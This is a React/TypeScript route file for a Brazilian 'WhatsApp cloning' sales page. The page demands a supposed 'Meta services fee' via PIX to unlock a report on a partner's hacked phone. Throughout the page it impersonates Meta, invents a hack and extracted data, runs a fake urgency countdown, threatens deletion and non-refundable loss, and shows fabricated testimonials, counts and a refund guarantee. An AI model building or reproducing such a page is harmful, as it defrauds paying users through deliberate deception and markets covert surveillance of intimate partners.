import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useTargetName } from "@/lib/use-target-name";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useRef, useState } from "react";
import { z } from "zod";
import { createPixCharge, getPixStatus, type PixCharge } from "@/lib/pix.functions";
import { fbqTrackOnce, getMetaCookies, getPersistedUtms } from "@/lib/tracking";

const META_AMOUNT = 63.41;
const META_DESCRIPTION = "Recupera Relacionamento: Acesso Anual";

const searchSchema = z.object({
  phone: z.coerce.string().optional().default(""),
  sex: z.enum(["M", "F"]).optional().default("M"),
});

export const Route = createFileRoute("/taxa-meta")({
  head: () => ({
    meta: [
      { title: "Acesso: Método da Traição" },
      {
        name: "description",
        content:
          "Etapa obrigatória Meta para liberar o acesso completo e ininterrupto ao relatório de invasão e clonagem.",
      },
      { property: "og:title", content: "Acesso: Método da Traição" },
      {
        property: "og:description",
        content: "Etapa obrigatória para liberar o acesso completo ao relatório de clonagem.",
      },
      { property: "og:url", content: "https://clonawhats.com/taxa-meta" },
      { name: "robots", content: "noindex,follow" },
    ],
    links: [{ rel: "canonical", href: "https://clonawhats.com/taxa-meta" }],
  }),
  validateSearch: (s) => searchSchema.parse(s),
  component: TaxaMetaPage,
});

function TaxaMetaPage() {
  const { phone, sex } = Route.useSearch();
  const navigate = useNavigate();
  const createPix = useServerFn(createPixCharge);
  const checkPix = useServerFn(getPixStatus);
  const targetName = useTargetName();
  const doAlvo = targetName ? `de ${targetName}` : "do alvo";

  const [charge, setCharge] = useState<PixCharge | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [statusLabel, setStatusLabel] = useState("Aguardando confirmação…");
  const [showPix, setShowPix] = useState(false);
  const createdRef = useRef(false);

  // Timer de urgência (15 min)
  const [secondsLeft, setSecondsLeft] = useState(15 * 60);
  useEffect(() => {
    const id = window.setInterval(() => {
      setSecondsLeft((s) => (s > 0 ? s - 1 : 0));
    }, 1000);
    return () => window.clearInterval(id);
  }, []);
  const mm = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
  const ss = String(secondsLeft % 60).padStart(2, "0");

  useEffect(() => {
    if (!showPix || createdRef.current) return;
    createdRef.current = true;
    (async () => {
      try {
        const { fbc, fbp } = getMetaCookies();
        const utms = getPersistedUtms();
        const c = await createPix({
          data: { amount: META_AMOUNT, description: META_DESCRIPTION, fbc, fbp, utms, phone, gender: sex },
        });
        setCharge(c);
        (window as any).dataLayer = (window as any).dataLayer || [];
        (window as any).dataLayer.push({ event: "gerar_pix", valor: c.amount, produto_id: "taxa_meta", moeda: "BRL" });
        fbqTrackOnce(`ic-taxa-meta-${c.externalId}`, "InitiateCheckout", {
          value: c.amount,
          currency: "BRL",
          content_ids: [c.externalId],
          content_type: "upsell_taxa_meta",
          phone,
          gender: sex,
        });
      } catch (e: any) {
        setError(e?.message || "Falha ao gerar PIX");
      }
    })();
  }, [showPix, createPix, phone, sex]);

  const paidRef = useRef(false);
  useEffect(() => {
    if (!charge?.id) return;
    let cancelled = false;
    let pollCount = 0;
    const tick = async (force = false) => {
      if (paidRef.current || cancelled) return;
      const light = !force && pollCount++ % 6 !== 5;
      try {
        const s = await checkPix({ data: { id: charge.id, light } });
        if (cancelled) return;
        if (s.paid) {
          paidRef.current = true;
          setStatusLabel("Taxa Meta confirmada!");
          (window as any).dataLayer = (window as any).dataLayer || [];
          (window as any).dataLayer.push({ event: "purchase", transaction_id: charge.id, valor: charge.amount, moeda: "BRL" });
          fbqTrackOnce(`purchase-taxa-meta-${charge.externalId}`, "Purchase", {
            value: charge.amount,
            currency: "BRL",
            content_ids: [charge.externalId],
            content_type: "upsell_taxa_meta",
            phone,
            gender: sex,
            transaction_id: charge.id,
          });
          const qs = new URLSearchParams({ phone: phone ?? "", sex: sex ?? "M" }).toString();
          window.location.assign(`/conta-poupanca?${qs}`);
        } else {
          setStatusLabel("Aguardando confirmação…");
        }
      } catch {}
    };
    tick();
    const id = window.setInterval(() => tick(), 4000);
    const onVis = () => { if (document.visibilityState === "visible") tick(true); };
    const onFocus = () => tick(true);
    window.addEventListener("visibilitychange", onVis);
    window.addEventListener("focus", onFocus);
    return () => {
      cancelled = true;
      window.clearInterval(id);
      window.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("focus", onFocus);
    };
  }, [charge?.id, charge?.amount, charge?.externalId, checkPix, navigate, phone, sex]);

  const copy = async () => {
    if (!charge?.pixCopiaCola) return;
    try {
      await navigator.clipboard.writeText(charge.pixCopiaCola);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {}
  };

  const qrImgSrc =
    charge?.qrCodeBase64 ||
    (charge?.pixCopiaCola
      ? `https://api.qrserver.com/v1/create-qr-code/?size=320x320&margin=0&data=${encodeURIComponent(charge.pixCopiaCola)}`
      : "");

  return (
    <div className="min-h-screen bg-white text-slate-900 font-['Inter',sans-serif] relative overflow-hidden">
      <div
        className="absolute inset-0 pointer-events-none"
        style={{
          backgroundImage:
            "linear-gradient(to right, rgba(128,128,128,0.07) 1px, transparent 1px), linear-gradient(to bottom, rgba(128,128,128,0.07) 1px, transparent 1px)",
          backgroundSize: "32px 32px",
        }}
      />
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-sky-500/[0.08] blur-[140px] rounded-full pointer-events-none" />

      {/* Barra de urgência */}
      <div className="relative z-20 bg-gradient-to-r from-red-600 via-red-500 to-red-600 text-slate-900 text-center py-2 text-[12px] font-bold uppercase tracking-wider shadow-lg">
        ⏱️ Liberação Meta expira em <span className="font-['Geist_Mono',monospace] bg-white/70 px-2 py-0.5 rounded ml-1">{mm}:{ss}</span> — depois disso o acesso é apagado
      </div>

      <div className="relative z-10 max-w-md mx-auto px-4 py-6 space-y-5">
        {/* Header — sigilo aprovado */}
        <div className="bg-yellow-600/15 border border-yellow-300 rounded-2xl p-4 flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-yellow-100 border border-yellow-500/50 flex items-center justify-center text-[#25D366] text-xl">
            ✓
          </div>
          <div>
            <div className="text-[10px] uppercase tracking-[0.2em] text-[#128C7E]/80 font-['Geist_Mono',monospace] font-bold">
              Sigilo confirmado · Invasão concluída
            </div>
            <div className="text-sm font-bold text-yellow-800">
              Falta apenas 1 passo para o acesso total
            </div>
          </div>
        </div>

        {/* Alerta vermelho — bloqueio Meta */}
        <div className="bg-red-950/40 border-2 border-red-500/60 rounded-2xl p-4 shadow-[0_0_40px_-10px_rgba(239,68,68,0.5)] animate-pulse-slow">
          <div className="flex items-start gap-2 mb-1">
            <span className="text-2xl">🚨</span>
            <div>
              <div className="text-[10px] uppercase tracking-[0.2em] text-red-700 font-['Geist_Mono',monospace] font-bold">
                Acesso retido pela Meta
              </div>
              <div className="text-[15px] font-extrabold text-red-700 leading-tight mt-0.5">
                O relatório {doAlvo} está pronto — mas travado no servidor da Meta.
              </div>
            </div>
          </div>
          <p className="text-[12px] text-red-700/90 leading-snug mt-2">
            Todo o conteúdo (conversas, fotos, áudios, localização em tempo real e
            histórico bancário) já foi extraído. A liberação depende <span className="font-bold underline decoration-red-400">exclusivamente</span> do pagamento da taxa oficial da Meta.
          </p>
        </div>

        {/* Card principal Meta */}
        <div className="bg-gradient-to-br from-sky-600/20 to-blue-900/10 border-2 border-sky-500/50 rounded-3xl p-6 shadow-[0_0_40px_-10px_rgba(56,189,248,0.4)]">
          <div className="flex items-start gap-3 mb-3">
            <span className="text-3xl">ⓜ️</span>
            <div>
              <div className="text-[10px] uppercase tracking-[0.2em] text-sky-300 font-['Geist_Mono',monospace] font-bold">
                Custo operacional oficial
              </div>
              <h1 className="text-xl font-extrabold leading-tight mt-1">
                Taxa de <span className="text-sky-400">Serviços Meta</span>
              </h1>
              <div className="text-[11px] text-sky-200/70 mt-1">
                Meta Platforms Brasil · Ref. #MTA-{new Date().getFullYear()}-BR
              </div>
            </div>
          </div>

          <p className="text-[13px] text-slate-800 leading-snug">
            Para clonar o dispositivo {doAlvo}, nossa engenharia usou APIs internas
            da <span className="text-sky-300 font-bold">Meta</span> (proprietária do
            WhatsApp, Instagram e Facebook). Cada invasão gera um custo cobrado
            <span className="font-bold"> diretamente pela plataforma</span>:
          </p>

          <div className="mt-4 bg-white/70 border border-red-300 rounded-xl p-3 text-[12px] text-red-700 leading-snug">
            ⚠️ <span className="font-bold">Sem esse pagamento</span>, os servidores da
            Meta <span className="font-bold underline">apagam o relatório em até 24h</span>{" "}
            por política de conformidade — e o valor pago nas etapas anteriores{" "}
            <span className="font-bold">não é reembolsável</span>.
          </div>

          {/* O que libera */}
          <div className="mt-4 space-y-2">
            <div className="text-[10px] uppercase tracking-[0.2em] text-sky-400/80 font-['Geist_Mono',monospace] font-bold">
              Após o pagamento você desbloqueia:
            </div>
            <ul className="space-y-2 text-[13px] text-slate-800">
              <li className="flex gap-2">
                <span className="text-[#128C7E] font-bold">✓</span>
                <span><span className="font-bold">Conversas do WhatsApp</span> — arquivadas, apagadas e grupos secretos.</span>
              </li>
              <li className="flex gap-2">
                <span className="text-[#128C7E] font-bold">✓</span>
                <span><span className="font-bold">Fotos e vídeos ocultos</span> na galeria e no cofre do WhatsApp.</span>
              </li>
              <li className="flex gap-2">
                <span className="text-[#128C7E] font-bold">✓</span>
                <span><span className="font-bold">Áudios enviados e recebidos</span> nas últimas 72h.</span>
              </li>
              <li className="flex gap-2">
                <span className="text-[#128C7E] font-bold">✓</span>
                <span><span className="font-bold">Localização em tempo real</span> — atualizada a cada 3 minutos.</span>
              </li>
              <li className="flex gap-2">
                <span className="text-[#128C7E] font-bold">✓</span>
                <span><span className="font-bold">Instagram e Direct</span> — inclusive contas secundárias (fakes).</span>
              </li>
              <li className="flex gap-2">
                <span className="text-[#128C7E] font-bold">✓</span>
                <span><span className="font-bold">Espelhamento por 30 dias</span> — cada nova mensagem chega no seu painel.</span>
              </li>
            </ul>
          </div>

          {/* Ancoragem de preço */}
          <div className="mt-5 bg-white/70 border border-sky-500/30 rounded-2xl p-4 text-center">
            <div className="text-[11px] uppercase tracking-[0.2em] text-slate-500 font-['Geist_Mono',monospace]">
              Custo oficial da Meta
            </div>
            <div className="mt-1 text-slate-500 line-through text-lg">
              De R$ 189,00
            </div>
            <div className="text-[11px] text-[#128C7E] font-bold uppercase tracking-wider">
              Desconto de parceria · 66% OFF
            </div>
            <div className="mt-2">
              <span className="text-sky-400 text-5xl font-extrabold tracking-tight">R$63</span>
              <span className="text-sky-400 text-2xl font-bold">,41</span>
            </div>
            <div className="text-[11px] text-slate-500 mt-1">
              Pagamento único · liberação imediata · sem mensalidade
            </div>
          </div>

          <button
            onClick={() => setShowPix(true)}
            className="mt-5 flex w-full min-h-14 items-center justify-center text-center bg-sky-500 hover:bg-sky-400 text-slate-900 font-extrabold rounded-2xl transition-all active:scale-[0.98] shadow-[0_0_40px_-8px_rgba(56,189,248,0.8)] text-[15px] uppercase tracking-wide"
          >
            🔓 Liberar acesso agora — R$ 63,41
          </button>
          <p className="text-center text-[11px] text-slate-500 mt-3">
            🔒 PIX seguro · liberação automática em segundos
          </p>
        </div>

        {/* PIX */}
        {showPix && (
          <div id="pix-box" className="bg-gradient-to-br from-white/90 to-slate-50/40 backdrop-blur-xl border border-sky-500/30 rounded-3xl p-6 space-y-4 shadow-[0_20px_60px_rgba(56,189,248,0.15)]">
            <div className="text-center space-y-1">
              <div className="text-[10px] uppercase tracking-[0.2em] text-sky-400/80 font-['Geist_Mono',monospace]">
                Taxa de Serviços Meta
              </div>
              <div>
                <span className="text-sky-400 text-4xl font-extrabold tracking-tight">R$63</span>
                <span className="text-sky-400 text-lg font-bold">,41</span>
              </div>
            </div>

            {error && (
              <div className="bg-red-50 border border-red-300 rounded-xl p-3 text-red-700 text-sm text-center">
                {error}
              </div>
            )}

            {!charge && !error && (
              <div className="flex flex-col items-center gap-3 py-6">
                <div className="w-10 h-10 border-2 border-sky-500/30 border-t-sky-400 rounded-full animate-spin" />
                <p className="text-sm text-slate-500">Gerando seu código PIX…</p>
              </div>
            )}

            {charge && (
              <>
                <div className="bg-white p-3 rounded-2xl mx-auto w-fit">
                  {qrImgSrc ? (
                    <img src={qrImgSrc} alt="QR Code PIX" className="w-56 h-56 block" />
                  ) : (
                    <div className="w-56 h-56 grid place-items-center text-slate-500 text-xs">
                      QR indisponível
                    </div>
                  )}
                </div>

                <div>
                  <label className="text-[10px] uppercase tracking-[0.2em] text-slate-500 font-['Geist_Mono',monospace]">
                    PIX Copia e Cola
                  </label>
                  <div className="mt-1 bg-white border border-slate-200 rounded-xl p-3 text-[11px] font-['Geist_Mono',monospace] text-slate-700 break-all max-h-24 overflow-y-auto">
                    {charge.pixCopiaCola}
                  </div>
                  <button
                    onClick={copy}
                    className="mt-2 w-full h-12 bg-sky-500 hover:bg-sky-400 text-slate-900 font-bold rounded-xl transition-all active:scale-[0.98] uppercase tracking-wide text-sm"
                  >
                    {copied ? "✅ Copiado!" : "📋 Copiar código PIX"}
                  </button>
                </div>

                <div className="flex items-center justify-center gap-2 text-[12px] text-slate-500">
                  <span className="w-2 h-2 rounded-full bg-sky-400 animate-pulse" />
                  {statusLabel}
                </div>
              </>
            )}
          </div>
        )}

        {/* Prova social */}
        <div className="bg-white border border-slate-200 rounded-2xl p-4 space-y-3">
          <div className="text-[11px] uppercase tracking-[0.2em] text-sky-400/80 font-['Geist_Mono',monospace] font-bold">
            Quem já liberou hoje:
          </div>
          <div className="space-y-3 text-[12px]">
            <div className="border-l-2 border-yellow-500/60 pl-3">
              <div className="text-slate-800">
                "Paguei a taxa Meta e em 40 segundos apareceu tudo. Descobri que ele
                tinha uma segunda conta escondida no Instagram."
              </div>
              <div className="text-slate-500 text-[11px] mt-1">— Camila R., São Paulo · há 4 min</div>
            </div>
            <div className="border-l-2 border-yellow-500/60 pl-3">
              <div className="text-slate-800">
                "Achei que era caro pelo relatório, mas o valor da Meta é o que
                realmente destrava o WhatsApp ao vivo. Valeu MUITO."
              </div>
              <div className="text-slate-500 text-[11px] mt-1">— Fernanda M., Belo Horizonte · há 12 min</div>
            </div>
          </div>
          <div className="flex items-center gap-2 text-[11px] text-[#128C7E] font-bold pt-1 border-t border-slate-200">
            <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
            2.847 liberações Meta processadas nas últimas 24h
          </div>
        </div>

        {/* Garantia */}
        <div className="bg-gradient-to-br from-yellow-950/40 to-slate-50/60 border border-yellow-300 rounded-2xl p-4">
          <div className="flex items-start gap-3">
            <span className="text-2xl">🛡️</span>
            <div>
              <div className="text-[13px] font-extrabold text-yellow-700">
                Garantia total de liberação
              </div>
              <p className="text-[12px] text-slate-700 leading-snug mt-1">
                Se em <span className="font-bold">até 10 minutos</span> após o
                pagamento o acesso ao dispositivo clonado não for liberado,
                <span className="font-bold text-[#25D366]"> devolvemos 100%</span> do
                valor da taxa Meta automaticamente.
              </p>
            </div>
          </div>
        </div>

        {/* Reforço final */}
        <div className="bg-white border border-slate-200 rounded-2xl p-4 space-y-2">
          <p className="text-[12px] text-slate-700 leading-snug">
            ⓜ️ <span className="font-bold text-sky-300">Por que essa cobrança da Meta?</span>
          </p>
          <p className="text-[12px] text-slate-500 leading-snug">
            As APIs internas usadas para clonar o dispositivo normalmente só ficam
            disponíveis para <span className="text-slate-800 font-semibold">autoridades e órgãos oficiais</span>.
            Cada acesso individual gera um custo repassado à plataforma.
          </p>
          <p className="text-[12px] text-red-700 italic font-semibold">
            ⚠️ Sem essa liberação, o relatório é apagado em 24h.
          </p>
        </div>
      </div>
    </div>
  );
}
